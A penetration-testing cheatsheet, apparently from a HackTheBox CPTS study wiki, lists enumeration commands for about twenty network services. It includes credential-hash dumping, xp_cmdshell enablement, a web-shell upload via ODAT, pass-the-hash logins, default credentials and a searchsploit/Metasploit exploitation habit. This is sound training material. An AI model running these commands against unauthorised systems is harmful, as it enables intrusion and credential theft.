---
title: "Service Enumeration Cheatsheet"
type: cheatsheet
tags: [cheatsheet, enumeration, htb, network]
date_created: 2026-05-08
date_updated: 2026-05-08
sources: [cpts-footprinting]
---

# Service Enumeration Cheatsheet

See [[service-enumeration]] for full technique notes.

---

## Passive Recon / OSINT

```bash
# Certificate Transparency — enumerate subdomains
curl -s "https://crt.sh/?q=<domain>&output=json" | jq . | grep name | cut -d":" -f2 \
  | grep -v "CN=" | cut -d'"' -f2 | awk '{gsub(/\\n/,"\n");}1;' | sort -u

# Resolve subdomains to IPs (from subdomain list)
for i in $(cat subdomainlist); do host $i | grep "has address" | grep <domain> | cut -d" " -f1,4; done

# Query all DNS records for domain
dig any <domain>

# Shodan lookup for discovered IPs
for i in $(cat ip-addresses.txt); do shodan host $i; done

# Google dork — AWS S3 buckets
# intext:<company> inurl:amazonaws.com

# Google dork — Azure blobs
# inurl:blob.core.windows.net
```

---

## FTP — TCP 21

```bash
export target=<target>

# Nmap with all scripts and version detection
sudo nmap -sV -p21 -sC -A $target

# Nmap script trace (verbose NSE output)
sudo nmap -sV -p21 -sC -A $target --script-trace

# Anonymous download (mirror entire FTP root)
wget -m --no-passive ftp://anonymous:anonymous@$target

# Banner grab (raw TCP)
nc -nv $target 21
telnet $target 21

# FTPS banner grab (FTP over TLS)
openssl s_client -connect $target:21 -starttls ftp
```

---

## SMB — TCP 139, 445

```bash
export target=<target>

# Nmap
sudo nmap $target -sV -sC -p139,445

# List shares — null session
smbclient -N -L //$target

# Connect to share — null session
smbclient //$target/<share>

# Connect with credentials
smbclient //$target/<share> -U <user>

# smbmap — list shares null session
smbmap -H $target

# smbmap — list shares with credentials and recurse
smbmap -H $target -u '<user>' -p '<pass>' -r <share>

# CrackMapExec — null session share enum
crackmapexec smb $target --shares -u '' -p ''

# CrackMapExec — authenticated share enum
crackmapexec smb $target --shares -u '<user>' -p '<pass>'

# RPC null session
rpcclient -U "" $target

# RID brute-force (enumerate users 500–1100)
for i in $(seq 500 1100); do \
  rpcclient -N -U "" $target -c "queryuser 0x$(printf '%x\n' $i)" \
  | grep "User Name\|user_rid\|group_rid" && echo ""; done

# Impacket samrdump — RID brute-force
impacket-samrdump $target

# Enum4linux-ng — full SMB/RPC/LDAP enum
./enum4linux-ng.py $target -A

# Check server-side SMB session status
smbstatus
```

---

## NFS — TCP 111, 2049

```bash
export target=<target>

# Nmap
sudo nmap $target -p111,2049 -sV -sC

# NSE NFS scripts
sudo nmap --script nfs* $target -sV -p111,2049

# Show exported shares
showmount -e $target

# Mount NFS share
mkdir target-NFS
sudo mount -t nfs $target:/ ./target-NFS/ -o nolock
tree ./target-NFS/

# List files with owner names
ls -l ./target-NFS/

# List files with UIDs/GIDs (for impersonation)
ls -n ./target-NFS/

# Unmount
sudo umount ./target-NFS
```

---

## DNS — UDP/TCP 53

```bash
export target=<dns-server>

# Query NS records
dig ns <domain> @$target

# Query DNS server version
dig CH TXT version.bind $target

# Query all records (ANY)
dig any <domain> @$target

# Zone transfer (may dump full zone)
dig axfr <domain> @$target

# Zone transfer — internal subdomain
dig axfr internal.<domain> @$target

# Subdomain brute-force (bash loop)
for sub in $(cat /opt/useful/seclists/Discovery/DNS/subdomains-top1million-110000.txt); do
  dig $sub.<domain> @$target | grep -v ';\|SOA' | sed -r '/^\s*$/d' | grep $sub | tee -a subdomains.txt
done

# dnsenum automated enumeration + brute-force
dnsenum --dnsserver $target --enum -p 0 -s 0 -o subdomains.txt \
  -f /opt/useful/seclists/Discovery/DNS/subdomains-top1million-110000.txt <domain>
```

---

## SMTP — TCP 25, 465, 587

```bash
export target=<target>

# Nmap — smtp-commands, version
sudo nmap $target -sC -sV -p25

# Test open relay (16 tests)
sudo nmap $target -p25 --script smtp-open-relay -v

# Manual SMTP interaction
telnet $target 25
# EHLO mail1.domain.htb
# VRFY root
# VRFY <username>
# QUIT

# User enumeration via smtp-user-enum
smtp-user-enum -M VRFY -U ./footprinting-wordlist.txt -t $target -m 60 -w 20
```

---

## IMAP / POP3 — TCP 110, 143, 993, 995

```bash
export target=<target>

# Nmap
sudo nmap $target -sV -p110,143,993,995 -sC

# cURL IMAP listing
curl -k "imaps://$target" --user <user>:<pass>

# cURL verbose (shows TLS cert and capability)
curl -k "imaps://$target" --user <user>:<pass> -v

# OpenSSL IMAPS manual session
openssl s_client -connect $target:imaps
# tag0 LOGIN <user> <pass>
# tag1 LIST "" "*"
# tag2 SELECT INBOX
# tag3 FETCH 1 (BODY[])
# tag4 LOGOUT

# OpenSSL POP3S manual session
openssl s_client -connect $target:pop3s
# USER <user>
# PASS <pass>
# STAT
# LIST
# RETR 1
# QUIT
```

---

## SNMP — UDP 161, 162

```bash
export target=<target>

# SNMPwalk — dump all OIDs (community: public)
snmpwalk -v2c -c public $target

# SNMPwalk with custom community string
snmpwalk -v2c -c <community> $target

# Brute-force community strings
onesixtyone -c /usr/share/wordlists/seclists/Discovery/SNMP/snmp.txt $target

# Brute-force OIDs with known community string
braa <community>@$target:.1.3.6.*

# Nmap SNMP scripts (UDP)
sudo nmap -sU -p161 $target --script snmp-brute,snmp-info,snmp-interfaces,snmp-sysdescr
```

---

## MySQL — TCP 3306

```bash
export target=<target>

# Nmap — all mysql NSE scripts
sudo nmap $target -sV -sC -p3306 --script mysql*

# Connect — no password (check for empty root)
mysql -u root -h $target

# Connect with credentials
mysql -u root -p<password> -h $target
```

**MySQL session commands:**
```sql
show databases;
use <database>;
show tables;
show columns from <table>;
select * from <table>;
select * from <table> where <column> = "<string>";
select user, authentication_string from mysql.user;  -- get password hashes
```

---

## MSSQL — TCP 1433

```bash
export target=<target>

# Nmap — full MSSQL NSE suite
sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,\
ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes \
--script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER \
-sV -p1433 $target

# Metasploit ping/discovery
msfconsole -q -x "use auxiliary/scanner/mssql/mssql_ping; set rhosts $target; run; exit"

# Connect with Impacket — Windows auth
impacket-mssqlclient Administrator@$target -windows-auth

# Connect with Impacket — SQL auth
impacket-mssqlclient <user>@$target
```

**MSSQL/T-SQL session commands:**
```sql
SELECT name FROM master.dbo.sysdatabases;   -- list databases
USE <database>;
SELECT * FROM INFORMATION_SCHEMA.TABLES;
SELECT name, password_hash FROM sys.sql_logins;   -- dump hashes
EXEC xp_cmdshell 'whoami';   -- OS command execution (if enabled)
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;   -- enable xp_cmdshell
```

---

## Oracle TNS — TCP 1521

```bash
export target=<target>

# Nmap — version and SID brute-force
sudo nmap -p1521 -sV $target --open
sudo nmap -p1521 -sV $target --open --script oracle-sid-brute

# ODAT — all modules (full enumeration)
odat all -s $target

# Connect with sqlplus
sqlplus <user>/<pass>@$target/<SID>

# Connect as sysdba
sqlplus <user>/<pass>@$target/<SID> as sysdba
```

**SQLplus session commands:**
```sql
select table_name from all_tables;
select * from user_role_privs;
select name, password from sys.user$;   -- extract hashes
```

**File upload via ODAT:**
```bash
odat utlfile -s $target -d XE -U scott -P tiger --sysdba \
  --putFile C:\\inetpub\\wwwroot shell.aspx ./shell.aspx
```

**Fix shared library error:**
```bash
sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf"; sudo ldconfig
```

---

## IPMI — UDP 623

```bash
export target=<target>

# Nmap IPMI version detection
sudo nmap -sU -p623 $target --script ipmi-version

# Metasploit — version detection
msf6 > use auxiliary/scanner/ipmi/ipmi_version
msf6 > set rhosts $target
msf6 > run

# Metasploit — dump hashes (exploits RAKP flaw in IPMI 2.0)
msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes
msf6 > set rhosts $target
msf6 > run

# Crack IPMI hashes offline (hashcat mode 7300)
hashcat -m 7300 ipmi.txt /usr/share/wordlists/rockyou.txt

# HP iLO factory default (8 chars: uppercase + digits)
hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u
```

**Default credentials:**

| Product | Username | Password |
|---------|----------|----------|
| Dell iDRAC | root | calvin |
| HP iLO | Administrator | randomized 8-char |
| Supermicro IPMI | ADMIN | ADMIN |

---

## SSH — TCP 22

```bash
export target=<target>

# SSH audit — check ciphers and key exchange algorithms
./ssh-audit.py $target

# Verbose connection — shows auth methods and banner
ssh -v <user>@$target

# Force password auth (for brute-force enumeration)
ssh -v <user>@$target -o PreferredAuthentications=password

# Connect with private key
ssh -i <keyfile> <user>@$target

# SSH with non-standard port
ssh -p <port> <user>@$target
```

---

## RSYNC — TCP 873

```bash
export target=<target>

# Nmap
sudo nmap -sV -p873 $target

# Probe available shares via netcat
nc -nv $target 873
# Type: #list

# List share contents
rsync -av --list-only rsync://$target/<share>

# Download all files from share
rsync -av rsync://$target/<share> ./

# Rsync over SSH
rsync -av -e "ssh -p 22" rsync://$target/<share> ./
```

---

## R-Services — TCP 512, 513, 514

```bash
export target=<target>

# Nmap
sudo nmap -sV -p512,513,514 $target

# rlogin — authenticate via trust files
rlogin $target -l <username>

# List authenticated users on local network
rwho

# Detailed session listing
rusers -al $target
```

---

## RDP — TCP 3389

```bash
export target=<target>

# Nmap with RDP NSE scripts
nmap -sV -sC $target -p3389 --script rdp*

# RDP security check (unauthenticated)
./rdp-sec-check.pl $target

# Connect via xfreerdp
xfreerdp /u:<user> /p:"<password>" /v:$target

# Connect — ignore TLS certificate warning
xfreerdp /u:<user> /p:"<password>" /v:$target /cert-ignore

# Connect with hash (Pass-the-Hash)
xfreerdp /u:<user> /pth:<NTLM-hash> /v:$target

# Connect with domain
xfreerdp /u:<user> /p:"<password>" /d:<domain> /v:$target
```

---

## WinRM — TCP 5985 (HTTP), 5986 (HTTPS)

```bash
export target=<target>

# Nmap
nmap -sV -sC $target -p5985,5986 --disable-arp-ping -n

# evil-winrm — interactive PowerShell shell
evil-winrm -i $target -u <user> -p <password>

# evil-winrm — Pass-the-Hash
evil-winrm -i $target -u <user> -H <NTLM-hash>

# evil-winrm — with SSL (port 5986)
evil-winrm -i $target -u <user> -p <password> -S
```

---

## WMI — TCP 135 + dynamic

```bash
export target=<target>

# wmiexec.py — remote command execution
python3 /usr/share/doc/python3-impacket/examples/wmiexec.py \
  <user>:"<password>"@$target "whoami"

# Impacket shortcut
impacket-wmiexec <user>:"<password>"@$target "hostname"

# Pass-the-Hash via WMI
impacket-wmiexec -hashes :<NTLM-hash> <user>@$target "whoami"
```

---

## LDAP — TCP 389, 636

```bash
export target=<target>

# Nmap LDAP scripts
nmap -sV -p389 $target --script ldap-rootdse,ldap-search

# Anonymous bind — check if allowed
ldapsearch -x -H ldap://$target -b "dc=<domain>,dc=<tld>"

# Authenticated LDAP query
ldapsearch -x -H ldap://$target -D "<user>@<domain>" -w "<pass>" \
  -b "dc=<domain>,dc=<tld>"

# Enumerate all users
ldapsearch -x -H ldap://$target -D "<user>@<domain>" -w "<pass>" \
  -b "dc=<domain>,dc=<tld>" "(objectClass=user)" sAMAccountName

# Enumerate all computers
ldapsearch -x -H ldap://$target -D "<user>@<domain>" -w "<pass>" \
  -b "dc=<domain>,dc=<tld>" "(objectClass=computer)" name
```

---

## Quick-Reference: Ports and Tools

| Port(s) | Protocol | Primary Tools |
|---------|----------|---------------|
| 21/tcp | FTP | `nmap -sC`, `wget`, `nc`, `openssl s_client` |
| 22/tcp | SSH | `ssh-audit`, `ssh -v` |
| 25,465,587/tcp | SMTP | `nmap`, `telnet`, `smtp-user-enum` |
| 53/tcp+udp | DNS | `dig axfr`, `dnsenum` |
| 110,995/tcp | POP3 | `openssl s_client`, `curl` |
| 111,2049/tcp | NFS | `showmount`, `mount`, `nmap --script nfs*` |
| 139,445/tcp | SMB | `smbclient`, `smbmap`, `crackmapexec`, `enum4linux-ng`, `rpcclient` |
| 143,993/tcp | IMAP | `openssl s_client`, `curl -k imaps://` |
| 161/udp | SNMP | `snmpwalk`, `onesixtyone`, `braa` |
| 389,636/tcp | LDAP | `ldapsearch`, `nmap` |
| 512-514/tcp | R-Services | `rlogin`, `rwho`, `rusers` |
| 623/udp | IPMI | `nmap`, Metasploit `ipmi_dumphashes`, `hashcat -m 7300` |
| 873/tcp | RSYNC | `nc`, `rsync -av --list-only` |
| 1433/tcp | MSSQL | `nmap --script ms-sql-*`, `impacket-mssqlclient` |
| 1521/tcp | Oracle TNS | `nmap --script oracle-sid-brute`, `odat`, `sqlplus` |
| 3306/tcp | MySQL | `nmap --script mysql*`, `mysql -u root -h` |
| 3389/tcp | RDP | `nmap --script rdp*`, `rdp-sec-check.pl`, `xfreerdp` |
| 5985,5986/tcp | WinRM | `evil-winrm` |
| 135/tcp | WMI | `impacket-wmiexec` |

---

## Cross-References

- [[wiki/cheatsheets/nmap]] — scanning foundation
- [[sql-injection]] — MySQL/MSSQL exploitation
- [[pass-the-hash]] — NTLM credential reuse
- [[password-cracking]] — offline hash cracking
- [[ad-cheatsheet|Active Directory cheatsheet]] — LDAP/SMB/WinRM/RDP in AD context
- [[wiki/cheatsheets/recon]] — passive recon before enumeration

## Fingerprint -> Exploit: the searchsploit + Metasploit quick-win reflex

The instant a service is fingerprinted to a **product + version**, run BOTH of these BEFORE hand-rolling a PoC or deep-diving a CVE writeup. A canned Exploit-DB PoC or a ready `use`-able msf module is very often an instant shell, and it beats reinventing it.

```bash
# local Exploit-DB search (offline) — then read/copy the match
searchsploit blogengine 3.3          # match by product + version
searchsploit -x 47010                 # READ the PoC before running it
searchsploit -m 47010                 # copy it into the working dir

# Metasploit module search — a matching module = often instant RCE
msfconsole -qx "search blogengine; exit"
msfconsole -qx "search type:exploit platform:windows cve:2019-6714; exit"
```

Habit / checklist:
1. nmap/whatweb gives `<product> <version>` -> immediately `searchsploit <product> <version>` AND `msfconsole -qx "search <product>"`.
2. A hit -> `searchsploit -x <id>` (read it) or `use <module>` before writing anything custom.
3. Cross-check the version against the wiki CVE lookup ([[cve-arsenal]]) and [[metasploit]]; prefer the documented/ready PoC over a fresh one.
4. Watch for **mislabeled CVE/EDB numbers** — vendors and write-ups conflate them (one EDB id can map to a differently-numbered CVE, and the same bug gets cited under 2-3 CVEs). Trust the PoC's actual behaviour + the affected-version string, not the label.

This is the "known version -> quick win" reflex: most boot-to-root footholds are a searchsploit/msf one-liner away once the version is pinned, and skipping it to hand-roll is the recurring time sink. See [[pentest-methodology]] · [[metasploit]] · [[cve-arsenal]].

<!-- promoted-slug: version-searchsploit-msf-reflex -->
